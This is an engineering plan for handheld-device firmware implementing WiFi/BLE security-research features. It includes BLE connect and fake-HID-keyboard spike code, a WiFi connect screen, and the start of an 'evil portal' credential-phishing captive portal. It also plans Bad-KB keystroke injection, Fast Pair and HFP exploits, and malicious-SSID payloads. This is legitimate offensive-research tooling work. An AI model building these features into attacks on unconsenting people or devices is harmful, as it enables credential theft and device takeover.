# Phase 2 Plan 2: Tab5-Native WiFi/BLE Suite — Remaining Features Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement the remaining WiFi/BLE security-research features from `docs/superpowers/specs/2026-08-06-phase2-tab5-wifi-ble-design.md` that were deferred out of the first Phase 2 plan (`docs/superpowers/plans/2026-08-09-phase2-wifi-ble-core-plan.md`, fully merged), now informed by that plan's real-hardware results and a fresh donor-source research pass.

**Architecture:** Two spikes first (BLE central/client-connect role; BLE HID/Bad-KB), since five of this plan's tasks are contingent on the first spike's result and one on the second's. Then eleven unconditional tasks build on already-proven capabilities (BLE scan/observer, BLE peripheral/advertise, WiFi softAP+webserver). Every screen uses the established `build_sub_screen()`/`LV_EVENT_DELETE` pattern; every cross-task state access uses the established portMUX/volatile discipline documented in `hal/c2link_ble.cpp`.

**Tech Stack:** Raw ESP-IDF NimBLE (`host/ble_gap.h`, `host/ble_gattc.h`, `host/ble_hs.h`) for all BLE central-role work — donor code (Bruce, Poseidon) uses the `NimBLEDevice`/`NimBLEClient` C++ wrapper (NimBLE-Arduino), which this project does not use; every task below translates the donor's *technique* into raw ESP-IDF calls, matching this project's existing `c2link_ble.cpp`/`ble_scan.cpp`/`ble_spam.cpp` style. `WiFi.h`/`ESPAsyncWebServer`/`DNSServer` for the evil portal (standard Arduino libraries, no raw-frame work involved).

## Global Constraints

- Raw ESP-IDF NimBLE only for all Tab5 BLE work — never NimBLE-Arduino (confirmed incompatible with the P4 in Phase 1; donor code samples cited in task briefs below use NimBLE-Arduino API names for reference only, and must be translated to the raw C API, not transcribed literally).
- Standard `<esp_wifi.h>`/`<WiFi.h>` calls only, never internal `esp_wifi_remote_*` names.
- Every registered `FeatureModule` needs a real, non-null `on_start`.
- No `loop()` blocking >~50ms except already-disclosed exceptions (this plan adds none).
- Every non-root screen builds through `ui/screen_scaffold.h`'s `build_sub_screen(title, &content)`; every screen-owned pointer/state is cleared from that content's own `LV_EVENT_DELETE` handler, never a Back-button click handler — see `firmware/tab5/src/features/ble/ble_scan.cpp` for the current reference implementation of this pattern.
- Any data written on the NimBLE host task and read on the main/LVGL task needs either a `portMUX_TYPE`-guarded critical section (multi-field data) or `volatile` (single scalars) — see `hal/c2link_ble.cpp`'s house-rule comment (added 2026-08-13) and `ble_scan.cpp`'s locked-snapshot pattern for the established, twice-real-hardware-verified shape.
- Capture files (CSV, cloned-device metadata, etc.) go to `/quarky/captures/<category>/` on SD via `IStorage`/`StorageSD`, matching the convention `wifi_pmkid.cpp` established in the first Phase 2 plan.
- **AP+STA/advertising coexistence**: any task that touches `WiFi.mode()` must preserve `c2link_wifi`'s SoftAP the same way `wifi_common.cpp`/`wifi_spectrum.cpp` do (`WIFI_AP`→`WIFI_AP_STA`, `WIFI_OFF`→`WIFI_STA`, never a bare `WIFI_STA`/`WIFI_AP` that drops the existing mode). Any task that calls `ble_gap_adv_start()` must be aware it stops `c2link_ble`'s C2 advertisement (legacy advertising, one instance system-wide, confirmed in the first plan) and must call `ble_gap_adv_stop()` from its own `LV_EVENT_DELETE` handler on teardown — see `ble_spam.cpp`'s `LV_EVENT_DELETE` handler for the fixed reference pattern (finding I1 of the first plan's final review).

---

## Deferred — real hardware/source result rules these out of Tab5-native, not attempted in this plan

These features from the spec's Section 1 tables cannot work on Tab5-native for the same confirmed reason as the first plan's Task 4 (WiFi deauth) and Task 6 (WiFi PMKID capture): they require either raw 802.11 frame TX (`esp_wifi_80211_tx()`) or WiFi promiscuous-mode RX (`esp_wifi_set_promiscuous()`), both of which are Espressif weak-stub no-ops over this device's esp-hosted WiFiRemote transport (`ESP_ERR_NOT_SUPPORTED`, confirmed via disassembly — see `wifi_pmkid.cpp`'s file-level comment). Re-scoped to a future Cardputer-ADV-affinity or C5-sidecar phase with native, non-proxied WiFi radio hardware, same as Tasks 4/6:

- **WiFi client scan** (needs promiscuous-mode packet capture per the spec's own note)
- **WiFi deauth detector** (passive promiscuous sniffer for deauth floods)
- **WiFi probe sniff** (promiscuous)
- **WiFi CIW zero-click** — donor source research (`~/src/poseidon-tab5/src/features/wifi_ciw.cpp`) confirmed this is NOT plain SSID-crafted softAP as originally assumed: the actual SSID rotation happens via hand-built 802.11 beacon frames fired through `esp_wifi_80211_tx(WIFI_IF_AP, ...)` every rotation interval. The malicious-payload table itself (157 entries, 14 categories, `struct CiwPayload { char ssid[64]; uint8_t cat; }` in flash) is trivially portable and worth keeping as reference for whoever picks this up on native-radio hardware, but the TX mechanism this feature depends on is the same confirmed-broken path.
- **WiFi beacon spam** — donor source research (`~/src/poseidon-tab5/src/features/wifi_beacon_spam.cpp:107`) confirmed this also calls `esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false)` directly for every beacon sent, same blocker.
- **WiFi PMKID/handshake capture** — already deferred in the first plan (Task 6).
- **WiFi deauth** (single-target and "all")— already deferred in the first plan (Task 4).
- **GPS wardrive + WiGLE export** — deferred to Phase 6 per the spec's own note (needs the Cardputer-ADV's GNSS hat).

Evil portal's optional deauth toggle (Bruce's `evil_portal.cpp:292-303`, deauthing the real AP while the fake one is up) is a sub-feature of Task 4 below and is *omitted*, not a separate deferred item — the portal itself works fine without it (see Task 4).

---

### Task 1: BLE central/client-connect spike + shared connect helper

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_central.h`
- Create: `firmware/tab5/src/features/ble/ble_central.cpp`
- Modify: `firmware/tab5/src/main.cpp` (register the spike's debug trigger only — this task has no launcher tile of its own, see Step 4)

**Interfaces:**
- Consumes: the existing raw NimBLE host from `hal/c2link_ble.cpp` (same host, same `gap_event_cb` dispatch shape used for `BLE_GAP_EVENT_CONNECT`/`DISCONNECT`/`SUBSCRIBE` — see that file's `gap_event_cb` for the exact event-switch pattern this task's connect logic must match); the `BleDeviceInfo`/`ble_addr_to_str` model from `features/ble/ble_common.h` (Task 7 of the first plan) as the target-selection source (this spike connects to whatever the existing BLE Scan feature most recently discovered).
- Produces: `BleCentral::connect(const ble_addr_t &target, ble_gap_event_fn *event_cb, void *cb_arg) -> int` (returns the real `ble_gap_connect()` return code) and `BleCentral::disconnect(uint16_t conn_handle) -> int` (wraps `ble_gap_terminate`), both in `ble_central.h` — every later contingent task (13, 14, 16, 17, 18) calls these two functions rather than calling `ble_gap_connect`/`ble_gap_terminate` directly, so the connect/disconnect lifecycle logging and AP+STA-style bookkeeping lives in one place.

**Why this is a spike, same category of risk as the first plan's Tasks 2 and 7:** the first plan's Task 7 proved BLE central/**observer** role (`ble_gap_disc()`, passive scanning) works over this project's raw NimBLE host concurrently with `c2link_ble`'s always-on advertisement. BLE central/**client-connect** role (`ble_gap_connect()`, actually opening a connection to a peripheral and doing GATT operations) is a different capability, never exercised in this project. Five later tasks in this plan (GATT explorer, BLE flood, Fast Pair crypto exploit, HFP audio exploit, WhisperPair) all fundamentally require this role — donor-source research (2026-08-13) confirmed all five call `NimBLEDevice::createClient()`/`pClient->connect()`-equivalent APIs, not just GATT explorer as originally assumed. A negative result here means all five need the same honest deferred-to-Cardputer-ADV treatment as Tasks 4/6, decided by the project owner, not silently reworked or dropped.

- [ ] **Step 1: Write the shared connect/disconnect helper**

```cpp
// firmware/tab5/src/features/ble/ble_central.h
#pragma once
#include <host/ble_gap.h>

namespace BleCentral {
// Initiates a connection to target (own address type always
// BLE_OWN_ADDR_PUBLIC, matching every other raw-address use in this
// project's BLE code -- ble_scan.cpp, ble_spam.cpp). event_cb receives the
// same struct ble_gap_event dispatch shape hal/c2link_ble.cpp's
// gap_event_cb already uses (BLE_GAP_EVENT_CONNECT with event->connect.status
// == 0 on success, event->connect.conn_handle the handle to use for
// subsequent ble_gattc_* calls; BLE_GAP_EVENT_DISCONNECT when it drops).
// Returns the real ble_gap_connect() return code -- 0 means "connection
// attempt started", NOT "connected"; the caller's event_cb finds out the
// real outcome asynchronously via BLE_GAP_EVENT_CONNECT.
int connect(const ble_addr_t &target, int32_t timeout_ms, ble_gap_event_fn *event_cb, void *cb_arg);

// Wraps ble_gap_terminate(conn_handle, BLE_ERR_REM_USER_CONN_TERM) -- the
// standard "we're done, hang up" reason code. Safe to call on an
// already-disconnected handle (NimBLE returns a real error code, logged,
// not fatal).
int disconnect(uint16_t conn_handle);
}
```

```cpp
// firmware/tab5/src/features/ble/ble_central.cpp
#include "ble_central.h"
#include <Arduino.h>
#include <host/ble_hs.h>

namespace BleCentral {

int connect(const ble_addr_t &target, int32_t timeout_ms, ble_gap_event_fn *event_cb, void *cb_arg) {
    int rc = ble_gap_connect(BLE_OWN_ADDR_PUBLIC, &target, timeout_ms, nullptr, event_cb, cb_arg);
    Serial.printf("quarky-tab5: [ble-central] ble_gap_connect rc=%d\n", rc);
    return rc;
}

int disconnect(uint16_t conn_handle) {
    int rc = ble_gap_terminate(conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    Serial.printf("quarky-tab5: [ble-central] ble_gap_terminate rc=%d\n", rc);
    return rc;
}

} // namespace BleCentral
```

- [ ] **Step 2: Write the spike itself -- connect to the most recently BLE-scanned device, discover its services, disconnect**

```cpp
// firmware/tab5/src/features/ble/ble_central_spike.h
#pragma once
namespace BleCentralSpike {
// Connects to the given address, runs ble_gattc_disc_all_svcs() to
// enumerate services, logs every UUID found via Serial, then disconnects
// after kSpikeTimeoutMs. This is the spike's actual test: a real answer is
// "did BLE_GAP_EVENT_CONNECT fire with status==0, and did the service
// discovery callback report at least one real service UUID" -- not just
// "did ble_gap_connect() return 0" (that only means "attempt started" per
// ble_central.h's own doc comment, same class of gotcha as
// WIFI_SCAN_RUNNING vs WIFI_SCAN_FAILED from the first plan's Task 3).
void run(const uint8_t addr_val[6]);
}
```

```cpp
// firmware/tab5/src/features/ble/ble_central_spike.cpp
#include "ble_central_spike.h"
#include "ble_central.h"
#include <Arduino.h>
#include <host/ble_gap.h>
#include <host/ble_gattc.h>
#include <cstring>

namespace BleCentralSpike {

static constexpr int32_t kConnectTimeoutMs = 5000;
static constexpr uint32_t kSpikeTimeoutMs = 8000;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static uint32_t s_svc_count = 0;

static int disc_svc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_svc *service, void *arg) {
    if (error->status == 0 && service != nullptr) {
        s_svc_count++;
        char uuid_str[BLE_UUID_STR_LEN];
        ble_uuid_to_str(&service->uuid.u, uuid_str);
        Serial.printf("quarky-tab5: [ble-central-spike] service found: %s (handles %u-%u)\n",
                      uuid_str, service->start_handle, service->end_handle);
    } else if (error->status == BLE_HS_EDONE) {
        Serial.printf("quarky-tab5: [ble-central-spike] service discovery complete, %lu service(s)\n",
                      (unsigned long)s_svc_count);
        BleCentral::disconnect(conn_handle);
    } else {
        Serial.printf("quarky-tab5: [ble-central-spike] service discovery error status=%d\n", error->status);
    }
    return 0;
}

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            Serial.printf("quarky-tab5: [ble-central-spike] CONNECTED handle=%u -- starting service discovery\n",
                          s_conn_handle);
            s_svc_count = 0;
            int rc = ble_gattc_disc_all_svcs(s_conn_handle, disc_svc_cb, nullptr);
            Serial.printf("quarky-tab5: [ble-central-spike] ble_gattc_disc_all_svcs rc=%d\n", rc);
        } else {
            Serial.printf("quarky-tab5: [ble-central-spike] CONNECT FAILED status=%d\n", event->connect.status);
        }
        return 0;
    case BLE_GAP_EVENT_DISCONNECT:
        Serial.printf("quarky-tab5: [ble-central-spike] disconnected, reason=%d\n", event->disconnect.reason);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        return 0;
    default:
        return 0;
    }
}

void run(const uint8_t addr_val[6]) {
    ble_addr_t target{};
    target.type = BLE_ADDR_PUBLIC;
    memcpy(target.val, addr_val, 6);
    BleCentral::connect(target, kConnectTimeoutMs, gap_event_cb, nullptr);
}

} // namespace BleCentralSpike
```

- [ ] **Step 3: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 4: Wire a serial-debug trigger (no launcher tile -- this is a spike, not a feature)**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_central_spike.h"
// inside the existing QUARKY_SERIAL_DEBUG else-if chain, add:
} else if (c == 'c') {
    // Connects to the FIRST device the most recent BLE Scan found (requires
    // running BLE Scan first via 'g' so BleScanFeature has a populated
    // device list) -- see ble_central_spike.h for what this tests.
    Serial.println("quarky-tab5: [debug] BleCentralSpike::run() via serial trigger");
    // BleScanFeature must expose the first discovered device's address for
    // this to work -- add a small accessor if one doesn't already exist:
    //   const uint8_t *BleScanFeature::first_device_addr(); // nullptr if none
    const uint8_t *addr = BleScanFeature::first_device_addr();
    if (addr) {
        BleCentralSpike::run(addr);
    } else {
        Serial.println("quarky-tab5: [debug] no scanned device available -- run BLE Scan ('g') first");
    }
}
```

Add the accessor to `ble_scan.h`/`ble_scan.cpp`:

```cpp
// firmware/tab5/src/features/ble/ble_scan.h -- add
namespace BleScanFeature {
// ... existing register_module/start/poll ...
// Returns the address of the first device in the most recent scan's
// results, or nullptr if none. Added for Task 1 of the second Phase 2
// plan's central-connect spike, which needs a real target to connect to.
const uint8_t *first_device_addr();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_scan.cpp -- add, inside namespace BleScanFeature
const uint8_t *first_device_addr() {
    portENTER_CRITICAL(&s_devices_mux);
    bool has_one = s_device_count > 0;
    static uint8_t addr[6];
    if (has_one) memcpy(addr, s_devices[0].addr, 6);
    portEXIT_CRITICAL(&s_devices_mux);
    return has_one ? addr : nullptr;
}
```

- [ ] **Step 5: Real hardware verification (this is the spike's actual test)**

Flash. Trigger BLE Scan (`'g'`) near a real BLE peripheral you control (a smart-home device, a fitness tracker, anything advertising a connectable GATT server -- NOT `c2link_ble`'s own "Quarky-Tab5" advertisement, since connecting to yourself is untested territory this project has no reason to exercise). Wait for it to appear in the scanned list, then trigger the spike (`'c'`). Log the real `ble_gap_connect()` rc, whether `BLE_GAP_EVENT_CONNECT` fires with `status==0`, and whether `ble_gattc_disc_all_svcs()` reports at least one real service UUID. Also confirm `c2link_ble`'s own advertisement/connectability is undisturbed after the spike disconnects (BLE Scan already proved concurrent scan+advertise works; this spike additionally exercises concurrent connect-out+advertise, a new combination).

Decision point, same honesty standard as the first plan's Task 2/Task 4 relationship: if `ble_gap_connect()` never succeeds, or connects but `ble_gattc_disc_all_svcs()` never reports a real service, that is a real negative result -- note it plainly in the report. Tasks 13, 14, 16, 17, 18 below (all marked "contingent on Task 1") should not be dispatched until the project owner decides how to re-scope them, the same process used for Task 4 after Task 2's negative result.

- [ ] **Step 6: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_central.h firmware/tab5/src/features/ble/ble_central.cpp \
        firmware/tab5/src/features/ble/ble_central_spike.h firmware/tab5/src/features/ble/ble_central_spike.cpp \
        firmware/tab5/src/features/ble/ble_scan.h firmware/tab5/src/features/ble/ble_scan.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add BLE central/client-connect spike + shared BleCentral connect helper"
```

---

### Task 2: BLE HID/Bad-KB spike

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_hid_spike.h`
- Create: `firmware/tab5/src/features/ble/ble_hid_spike.cpp`
- Modify: `firmware/tab5/src/main.cpp`

**Interfaces:**
- Consumes: nothing from Task 1 (BLE HID is a peripheral-role capability -- the Tab5 advertises itself AS a keyboard, not connecting out to one -- so this spike does not depend on Task 1's result).
- Produces: nothing consumed by later tasks unless this spike passes, in which case Task 15 (Bad-KB feature) reuses whatever HID GATT service definition this spike establishes as working.

**Why this is a spike:** the spec's own Risks section (Section 3) flags this explicitly: "needs confirmation that NimBLE-Arduino's HID profile support functions correctly when BLE is running on a remote C6 rather than a local radio." This project doesn't use NimBLE-Arduino (raw ESP-IDF NimBLE only, per Global Constraints), so the real question is narrower and more concrete: does a raw ESP-IDF NimBLE peripheral advertising the standard BLE HID service (`0x1812`) with a keyboard report map get recognized and paired against by a real host OS (the way `c2link_ble`'s custom GATT service already works, but HID specifically requires the Human Interface Device Service + Report Map + Boot Keyboard characteristics in the exact shape HID hosts expect, which is new, unproven structure for this project, not just a new service UUID).

- [ ] **Step 1: Write a minimal BLE HID peripheral (advertise "QuarkyKB", accept a connection, expose a keyboard Report Map, send one fixed test keystroke on trigger)**

```cpp
// firmware/tab5/src/features/ble/ble_hid_spike.h
#pragma once
namespace BleHidSpike {
void start(); // begins advertising as a BLE HID keyboard
void send_test_keystroke(); // sends a fixed 'A' key-down+key-up report, once
void stop();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_hid_spike.cpp
#include "ble_hid_spike.h"
#include <Arduino.h>
#include <host/ble_hs.h>
#include <host/ble_gap.h>
#include <services/gap/ble_svc_gap.h>
#include <services/gatt/ble_svc_gatt.h>

namespace BleHidSpike {

// Standard BLE HID keyboard Report Map -- a fixed, well-known byte sequence
// (this exact report descriptor is the one every "generic BLE keyboard"
// tutorial/donor project uses; it is NOT project-specific data, it's the
// USB HID Usage Tables spec's boot-keyboard report format encoded as an HID
// report descriptor). 8-byte report: [modifier, reserved, key1..key6].
static const uint8_t kReportMap[] = {
    0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x05, 0x07,
    0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01,
    0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01,
    0x75, 0x08, 0x81, 0x01, 0x95, 0x05, 0x75, 0x01,
    0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
    0x95, 0x01, 0x75, 0x03, 0x91, 0x01, 0x95, 0x06,
    0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07,
    0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xC0
};

static uint16_t s_report_val_handle = 0;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;

static int report_access_cb(uint16_t, uint16_t, struct ble_gatt_access_ctxt *ctxt, void *) {
    // Input Report characteristic: host reads current report state (we
    // always report "no keys pressed" at rest), we write to notify.
    static const uint8_t kIdle[8] = {0};
    if (ctxt->op == BLE_GATT_ACCESS_OP_READ_CHR) {
        os_mbuf_append(ctxt->om, kIdle, sizeof(kIdle));
    }
    return 0;
}

static const struct ble_gatt_chr_def s_hid_chrs[] = {
    {
        .uuid = BLE_UUID16_DECLARE(0x2A4D), // Report
        .access_cb = report_access_cb,
        .val_handle = &s_report_val_handle,
        .flags = BLE_GATT_CHR_F_READ | BLE_GATT_CHR_F_NOTIFY,
    },
    {0},
};

static const struct ble_gatt_svc_def s_hid_svcs[] = {
    {
        .type = BLE_GATT_SVC_TYPE_PRIMARY,
        .uuid = BLE_UUID16_DECLARE(0x1812), // Human Interface Device
        .characteristics = s_hid_chrs,
    },
    {0},
};

static int gap_event_cb(struct ble_gap_event *event, void *) {
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        s_conn_handle = event->connect.status == 0 ? event->connect.conn_handle : BLE_HS_CONN_HANDLE_NONE;
        Serial.printf("quarky-tab5: [ble-hid-spike] connect status=%d handle=%u\n",
                      event->connect.status, s_conn_handle);
        return 0;
    case BLE_GAP_EVENT_DISCONNECT:
        Serial.printf("quarky-tab5: [ble-hid-spike] disconnected, reason=%d\n", event->disconnect.reason);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        return 0;
    default:
        return 0;
    }
}

void start() {
    ble_svc_gap_device_name_set("QuarkyKB");
    ble_gatts_count_cfg(s_hid_svcs);
    ble_gatts_add_svcs(s_hid_svcs);

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.appearance = 0x03C1; // HID Keyboard appearance value
    fields.appearance_is_present = 1;
    fields.name = (const uint8_t *)"QuarkyKB";
    fields.name_len = 8;
    fields.name_is_complete = 1;
    ble_gap_adv_set_fields(&fields);

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_UND; // connectable, undirected
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, gap_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-hid-spike] ble_gap_adv_start rc=%d\n", rc);
}

void send_test_keystroke() {
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE) {
        Serial.println("quarky-tab5: [ble-hid-spike] no host connected, cannot send keystroke");
        return;
    }
    // 'A' key-down (modifier=0, keycode 0x04 = 'a'/'A' per USB HID usage
    // table), then key-up, 50ms apart -- the minimum a real host needs to
    // register a distinct press.
    uint8_t down[8] = {0, 0, 0x04, 0, 0, 0, 0, 0};
    uint8_t up[8] = {0};
    struct os_mbuf *om = ble_hs_mbuf_from_flat(down, sizeof(down));
    int rc = ble_gatts_notify_custom(s_conn_handle, s_report_val_handle, om);
    Serial.printf("quarky-tab5: [ble-hid-spike] key-down notify rc=%d\n", rc);
    delay(50);
    om = ble_hs_mbuf_from_flat(up, sizeof(up));
    rc = ble_gatts_notify_custom(s_conn_handle, s_report_val_handle, om);
    Serial.printf("quarky-tab5: [ble-hid-spike] key-up notify rc=%d\n", rc);
}

void stop() {
    ble_gap_adv_stop();
    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    }
}

} // namespace BleHidSpike
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire serial-debug triggers**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_hid_spike.h"
// inside the QUARKY_SERIAL_DEBUG else-if chain:
} else if (c == 'h') {
    Serial.println("quarky-tab5: [debug] BleHidSpike::start() via serial trigger");
    BleHidSpike::start();
} else if (c == 'k') {
    // NOTE: 'k' is already used for the pairing screen trigger -- pick an
    // unused letter when implementing, e.g. 'j'.
    Serial.println("quarky-tab5: [debug] BleHidSpike::send_test_keystroke() via serial trigger");
    BleHidSpike::send_test_keystroke();
}
```

- [ ] **Step 4: Real hardware verification (the actual test)**

Flash. Trigger `start()`. On a real phone/laptop, open Bluetooth settings and confirm "QuarkyKB" appears and is recognized AS A KEYBOARD (not a generic/unknown BLE device -- this is the real test, since the HID appearance/service-UUID is what makes an OS treat it specially). Pair. Open a text field on the host device. Trigger `send_test_keystroke()` and confirm the letter "a" actually appears in the text field. This is the unambiguous pass/fail signal.

Decision point: if the device isn't recognized as a keyboard, or pairs but the keystroke never registers, that's a real negative result -- Task 15 (Bad-KB feature) should not be dispatched until the project owner decides how to re-scope it.

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_hid_spike.h firmware/tab5/src/features/ble/ble_hid_spike.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE HID/Bad-KB spike: minimal HID keyboard peripheral"
```

---

### Task 3: WiFi connect feature (trivial)

**Files:**
- Create: `firmware/tab5/src/features/wifi/wifi_connect.h`
- Create: `firmware/tab5/src/features/wifi/wifi_connect.cpp`
- Modify: `firmware/tab5/src/main.cpp`

**Interfaces:**
- Consumes: `RadioEspHosted::connect_wifi(const char*, const char*)` — already exists from Phase 1 Task 9, real-hardware-confirmed working (it's the function `main.cpp`'s own boot-time STA connect test already calls, currently gated behind placeholder-credential detection).
- Produces: nothing consumed by later tasks.

This is the spec's simplest listed feature ("Connect (join a network) | All three | Trivial `IRadio::connect_wifi` already exists from Phase 1"): a UI wrapper around an already-proven function, using the `lv_keyboard`/`lv_textarea` pattern proven in Phase 1 Task 8 for SSID/password entry.

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/wifi/wifi_connect.h
#pragma once
namespace WifiConnectFeature {
void register_module();
void start();
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_connect.cpp
#include "wifi_connect.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include "../../hal/radio_esp_hosted.h"
#include <feature_registry.h>
#include <lvgl.h>

extern FeatureRegistry g_registry;
extern RadioEspHosted radio; // defined in main.cpp (Phase 1 Task 9)

namespace WifiConnectFeature {

static lv_obj_t *s_ssid_input = nullptr;
static lv_obj_t *s_pass_input = nullptr;
static lv_obj_t *s_status_label = nullptr;
static lv_obj_t *s_keyboard = nullptr;

static void connect_click_cb(lv_event_t *e) {
    const char *ssid = lv_textarea_get_text(s_ssid_input);
    const char *pass = lv_textarea_get_text(s_pass_input);
    lv_label_set_text(s_status_label, "Connecting...");
    bool ok = radio.connect_wifi(ssid, pass);
    char buf[64];
    snprintf(buf, sizeof(buf), ok ? "Connected (ip=%u)" : "Connect failed", radio.local_ip());
    lv_label_set_text(s_status_label, buf);
}

static void input_focus_cb(lv_event_t *e) {
    lv_obj_t *ta = (lv_obj_t *)lv_event_get_target(e);
    lv_keyboard_set_textarea(s_keyboard, ta);
    lv_obj_clear_flag(s_keyboard, LV_OBJ_FLAG_HIDDEN);
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("WiFi Connect", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_ssid_input = lv_textarea_create(content);
    lv_textarea_set_one_line(s_ssid_input, true);
    lv_textarea_set_placeholder_text(s_ssid_input, "SSID");
    lv_obj_add_event_cb(s_ssid_input, input_focus_cb, LV_EVENT_FOCUSED, nullptr);

    s_pass_input = lv_textarea_create(content);
    lv_textarea_set_one_line(s_pass_input, true);
    lv_textarea_set_password_mode(s_pass_input, true);
    lv_textarea_set_placeholder_text(s_pass_input, "Password");
    lv_obj_add_event_cb(s_pass_input, input_focus_cb, LV_EVENT_FOCUSED, nullptr);

    lv_obj_t *connect_btn = lv_button_create(content);
    lv_obj_t *connect_label = lv_label_create(connect_btn);
    lv_label_set_text(connect_label, "Connect");
    lv_obj_add_event_cb(connect_btn, connect_click_cb, LV_EVENT_CLICKED, nullptr);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Not connected");

    s_keyboard = lv_keyboard_create(screen); // parented to screen, not content, so it overlays
    lv_obj_add_flag(s_keyboard, LV_OBJ_FLAG_HIDDEN);

    // s_ssid_input/s_pass_input/s_status_label/s_keyboard must not outlive
    // the screen -- see ui/screen_scaffold.cpp for why every sub-screen
    // clears its own widget pointers from LV_EVENT_DELETE, matching
    // wifi_scan.cpp/ble_scan.cpp's established pattern.
    lv_obj_add_event_cb(content, [](lv_event_t *e) {
        s_ssid_input = nullptr;
        s_pass_input = nullptr;
        s_status_label = nullptr;
        s_keyboard = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_connect", "WiFi Connect", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

} // namespace WifiConnectFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/wifi/wifi_connect.h"
// in setup(), before Shell::build:
WifiConnectFeature::register_module();
```

- [ ] **Step 4: Real hardware verification**

Flash. Open WiFi > WiFi Connect. Enter a real SSID/password you control via the on-screen keyboard. Confirm the status label reports success with a real, non-zero IP address, and that this doesn't disturb `c2link_wifi`'s existing SoftAP (check the Cardputer-ADV, if connected, still shows as linked in the devices panel afterward).

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/wifi/wifi_connect.h firmware/tab5/src/features/wifi/wifi_connect.cpp firmware/tab5/src/main.cpp
git commit -m "Add WiFi Connect feature (thin UI over Phase 1's proven connect_wifi)"
```

---

### Task 4: WiFi evil portal

**Files:**
- Create: `firmware/tab5/src/features/wifi/wifi_evil_portal.h`
- Create: `firmware/tab5/src/features/wifi/wifi_evil_portal.cpp`
- Modify: `firmware/tab5/src/main.cpp`
- Modify: `firmware/tab5/platformio.ini` (add `ESPAsyncWebServer`/`AsyncTCP` dependencies)

**Interfaces:**
- Consumes: `WiFi.softAP()`, standard Arduino AP mode (confirmed safe — donor-source research confirmed this is normal driver-level AP beacon generation, not `esp_wifi_80211_tx`-based, so it works over esp-hosted the same way `c2link_wifi`'s existing SoftAP already does).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13) confirmed both Bruce's `evil_portal.cpp` and Poseidon's `wifi_portal.cpp` are standard `WiFi.softAP()` + HTTP server + `DNSServer` wildcard-redirect captive portals — no raw-frame work in the core portal itself. Bruce's optional deauth toggle (deauthing the real AP while the fake one runs) is explicitly **omitted** here since it needs `esp_wifi_80211_tx`, confirmed broken.

- [ ] **Step 1: Add ESPAsyncWebServer/AsyncTCP dependencies**

```ini
; firmware/tab5/platformio.ini -- add to lib_deps
	ESP32Async/ESPAsyncWebServer@^3.1.0
	ESP32Async/AsyncTCP@^3.2.5
```

- [ ] **Step 2: Write the portal HTML template (one, to start -- a generic "Wi-Fi Login" captive portal, matching the spec's "4+" only in the sense that more can be added to this same array later; this task ships one real, complete template plus the mechanism for adding more)**

```cpp
// firmware/tab5/src/features/wifi/wifi_evil_portal.h
#pragma once
namespace WifiEvilPortalFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_evil_portal.cpp
#include "wifi_evil_portal.h"
#include "../../ui/screen_scaffold.h"
